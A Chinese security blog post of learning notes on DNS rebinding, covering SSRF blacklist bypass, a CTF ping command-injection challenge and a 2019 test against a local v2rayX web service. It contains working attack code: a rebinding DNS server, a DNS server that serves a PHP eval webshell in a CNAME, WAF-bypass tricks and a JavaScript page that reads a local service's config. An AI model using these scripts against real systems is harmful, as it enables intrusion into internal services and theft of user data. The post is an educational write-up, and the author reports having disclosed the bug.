Title: DNS Rebinding 
Category: Learning
Date: 2017-12-6
slug: dns-rebinding


最后的链接是关于dns rebinding的文章，这里主要做一个笔记：

先盗用ricterz.me的博客一个图
![](http://7d9lm5.com1.z0.glb.clouddn.com/2017-01-18-183643.jpg)

在ssrf的时候，客户修复过之后。再次判断url的时候，逻辑就是上图这个样子。

1. 获取请求的地址，如果是域名，通过DNS解析的方式获取真实IP，如果是IP则直接对比是否在指定的IP段内。
2. 比如获取了test.loli.club请求地址是10.0.0.1，黑名单是10.0.0.0/8，则拒绝访问

使用DNS Rebinding的会有这样的攻击效果:

1. 获取test.loli.club的请求地址不是10.0.0.0/8这个黑名单范围里面
2. 放行之后，然后后端请求这个URL的资源。如果TTL足够小，这个时候会又发生一次DNS解析。如果这个URL可控，我们就可以控制这次的解析IP。

DNS返回的数据包存在一个TTL(Time-to-Live),也就是域名解析记录在DNS服务器上的缓存时间。如果两次DNS的请求时间大于TTL，就会重新进行一次DNS解析请求。

所以，第一次发生DNS解析的时候，返回一个不在黑名单的IP地址，第二次服务端URL请求的时候，让服务器返回一次DNS解析，解析到黑名单地址，从而绕过。

根据goychou大神的脚本，测试以下步骤：

* 添加一个A记录，域名是ns.xyz.pw，指向服务器A
* 再添加一个ns记录，域名是rebind.xyz.pw，指向ns.xyz.pw

此时在A服务器上运行脚本:

```
from twisted.internet import reactor, defer
from twisted.names import client, dns, error, server
record={}
class DynamicResolver(object):
    def _doDynamicResponse(self, query):
        name = query.name.name
        if name not in record or record[name]<1:
            ip = "A IP"
        else:
            ip = "127.0.0.1"
        if name not in record:
            record[name] = 0
        record[name] += 1
        print name + " ===> " + ip
        answer = dns.RRHeader(
            name = name,
            type = dns.A,
            cls = dns.IN,
            ttl = 0,
            payload = dns.Record_A(address = b'%s' % ip, ttl=0)
        )
        answers = [answer]
        authority = []
        additional = []
        return answers, authority, additional
    def query(self, query, timeout=None):
        return defer.succeed(self._doDynamicResponse(query))
def main():
    factory = server.DNSServerFactory(
        clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    reactor.listenUDP(53, protocol)
    reactor.run()
if __name__ == '__main__':
    raise SystemExit(main())
```

此时，在Linux上面运行：

```
dig @8.8.8.8 rebind.xyz.pw
返回结果是A主机的IP

再次运行上面的命令:
dig @8.8.8.8 rebind.xyz.pw
返回结果是127.0.0.1

```

###TIPS
以下是从joychou大神博客来的：
在Linux，默认不会进行DNS缓存，除非运行nscd，dnsmaq等。


另外一个是Ph牛出的与dns有关的题目:


```

<?php
header('Content-Type: text/plain');
$ip = $_GET['ip']??exit;
duita($ip);
$ip = escapeshellcmd($ip);
$ip = str_replace('\>', '>', $ip);
$ip = str_replace('\<', '<', $ip);
$cmd = sprintf('ping -c 2 %s', $ip);
echo shell_exec($cmd);
 
function duita($ip)
{
    if(strpbrk($ip, "&;`|*?()$\\\x00") !== false) {
        exit('WAF');
    }
    if(stripos($ip, '.php') !== false) {
        exit('WAF');
    }
}

```


* 没有过滤`>`
* `"` `'`在成对的情况下escapeshellcmd是不会过滤的，所以`.p''php`绕过waf

搭建一个dns服务器:

```
import datetime
import sys
import time
import threading
import traceback
import socketserver
from dnslib import *

TTL = 300
def dns_response(data):
    request = DNSRecord.parse(data)
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qn.startswith('rebind.xyz.pw'):
        rdata = CNAME('<?=eval($_POST[1]?>.xyz.pw')
        reply.add_answer(RR(rname=qname, rtype=5, rclass=1, ttl=TTL, rdata=rdata))
    else:
        rdata = A('172.96.210.188')
        reply.add_answer(RR(rname=qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata))
    print("----Replay:\n", reply)
    return reply.pack()

class BaseRequestHandler(socketserver.BaseRequestHandler):
    def get_data(self):
        raise NotImplementedError
    def send_data(self, data):
        raise NotImplementedError
    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S:%f')
        try:
            data = self.get_data()
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)

class TCPRequestHandler(BaseRequestHandler):
    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = int(data[:2].encode('hex'), 16)
        if sz < len(data) -2:
            raise Exception("Wrong size of TCP Packet")
        elif sz > len(data) -2:
            raise Exception("Too big TCP Packet")
        return data[2:]

    def send_data(self, data):
        sz = hex(len(data))[2:].zfill(4).decode('hex')
        return self.request.sendall(sz + data)

class UDPRequestHandler(BaseRequestHandler):
    def get_data(self):
        return self.request[0].strip()
    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


if __name__ == '__main__':
    print("Starting nameserver")
    servers = [
        socketserver.ThreadingUDPServer(('',53),UDPRequestHandler),
        socketserver.ThreadingTCPServer(('', 53),TCPRequestHandler),
    ]
    for s in servers:
        thread = threading.Thread(target=s.serve_forever)
        thread.daemon = True
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()
    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()
```

这样：

```
dig rebind.xyz.pw的时候其中的cname是shell，但是本地ping的时候出现uknow host的错误
 dig rebind.xyz.pw

; <<>> DiG 9.8.3-P1 <<>> rebind.xyz.pw
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56051
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;rebind.xyz.pw.			IN	A

;; ANSWER SECTION:
rebind.xyz.pw.		300	IN	CNAME	<?=eval\(\$_POST[1]?>.xyz.pw.

;; Query time: 1266 msec
;; SERVER: 202.101.172.35#53(202.101.172.35)
;; WHEN: Wed Dec  6 15:52:56 2017
;; MSG SIZE  rcvd: 66


复现失败
```


======
2019/06/05更新:

这几天上网只能用v2rayX，看到在8070端口起了一个http服务，想起来微信爆出来的可以利用DNS Rebinding获取微信号的内容，看了下本地的服务跟微信插件的类似，甚至用的都是GCDWebServer，开始本地捣鼓一下能不能获取到配置文件。最后测试是可以的，就是得在页面等1分多钟，因为会有dns解析的缓存。

测试代码搬的: https://0x0d.im/archives/get-visitor-qq-number-through-dns-rebinding.html

```
<!DCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Rebind Test</title>
    </head>
    <body>
        <script src="http://upcdn.b0.upaiyun.com/libs/jquery/jquery-2.0.3.min.js"></script>
        <script>
        function GetUin(){
	    console.log("Testing");
            $.ajax({
            url: "http://rebind.xyz.xyz:8070/config.json",
            type: "GET",
            dataType: "text",
            success: function(data){
                alert(data);
		console.log(data);
                }
            });
        }
        setTimeout("GetUin()", 5000);
	setTimeout("GetUin()", 7000);
	setTimeout("GetUin()", 8000);
	setTimeout("GetUin()", 30000);
        setTimeout("GetUin()", 60000);
        setTimeout("GetUin()", 90000);
        </script>
    </body>
    </html>
  ```

坑:

昨天测了大半天，中间只成功了一次，大概是踩狗屎了。
chrome下做的测试，做完清缓存:

1. chrome://net-internals/#dns 和 chrome://net-internals/#sockets
2. chrome的清理缓存文件，历史纪录什么的
3. dscacheutil -flushcache;sudo killall -HUP mDNSResponder

rebind.xyz.xyz的ttl我设置了为2分钟，找了半天没有设置为0的dns解析服务。最后测试成功，撒花，怪不得微信插件那个要等1分多钟，测完给作者提了个bug，貌似是注册这么久第一次给人提bug。

这种本地起web服务的很容易受到攻击，就我查到的有:

1. visual studio远程命令执行
2. 暴雪的一款游戏什么的
3. QQ的获取QQ号码和微信插件获取好友列表

先挖坑，以后再补


* <https://joychou.org/web/use-dnsrebinding-to-bypass-ssrf-in-java.html>
* <https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction>
* <https://virusdefender.net/index.php/archives/685/>